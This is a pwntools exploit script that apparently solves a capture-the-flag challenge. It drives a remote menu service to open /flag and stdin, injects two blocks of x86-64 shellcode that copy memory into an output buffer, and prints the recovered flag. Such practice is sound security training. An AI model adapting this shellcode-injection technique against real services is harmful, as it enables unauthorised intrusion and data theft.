from pwn import *
context.arch="amd64"
context.log_level='debug'
# p=process("./challenge")
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
p = remote(HOST, int(PORT))
p.sendlineafter("Choice:","1")
p.sendlineafter(">","/flag")

p.sendlineafter("Choice:","1")
p.sendlineafter(">","/flag")

p.sendlineafter("Choice:","1")
p.sendlineafter(">","/proc/self/fd/0")
sleep(1)

shellcode="""
lea rdi,[rip]
sub rdi,0x2007
mov     rax, [rbp-0x28]
mov rsi,[rdi]
mov qword ptr [rax+0xc],rsi
mov rsi,[rdi+8]
mov qword ptr [rax+0xc+8],rsi
mov rsi,[rdi+16]
mov qword ptr [rax+0xc+16],rsi
mov rsi,[rdi+24]
mov qword ptr [rax+0xc+24],rsi
mov rsi,[rdi+32]
mov qword ptr [rax+0xc+32],rsi
mov rsi,[rdi+40]
mov qword ptr [rax+0xc+40],rsi
mov rsi,[rdi+48]
mov qword ptr [rax+0xc+48],rsi
mov rsi,[rdi+56]
mov qword ptr [rax+0xc+56],rsi
ret
"""
p.sendline(asm(shellcode))
#p.sendlineafter("Choice:","2")
#p.recvuntil("/flag:")
#p.recvline()
#flag1=p.recvuntil(":")[:-1]
#print(flag1)
p.sendlineafter("Choice:","1")
p.sendlineafter(">","/flag")
p.sendlineafter("Choice:","1")
p.sendlineafter(">","/proc/self/fd/0")
sleep(1)
shellcode2="""
lea rdi,[rip]
sub rdi,0x2007-64
mov     rax, [rbp-0x28]
mov rsi,[rdi]
mov qword ptr [rax+0xc],rsi
mov rsi,[rdi+8]
mov qword ptr [rax+0xc+8],rsi
mov rsi,[rdi+16]
mov qword ptr [rax+0xc+16],rsi
mov rsi,[rdi+24]
mov qword ptr [rax+0xc+24],rsi
mov rsi,[rdi+32]
mov qword ptr [rax+0xc+32],rsi
mov rsi,[rdi+40]
mov qword ptr [rax+0xc+40],rsi
mov rsi,[rdi+48]
mov qword ptr [rax+0xc+48],rsi
mov rsi,[rdi+56]
mov qword ptr [rax+0xc+56],rsi
ret
"""
p.sendline(asm(shellcode2))
p.sendlineafter("Choice:","2")
p.recvuntil("/flag:")
p.recvline()
flag1=p.recvuntil(":")[:-1]
p.recvuntil("/flag:")
p.recvline()
flag2=p.recvuntil(":")[:-1]
print(flag1+flag2)
p.interactive()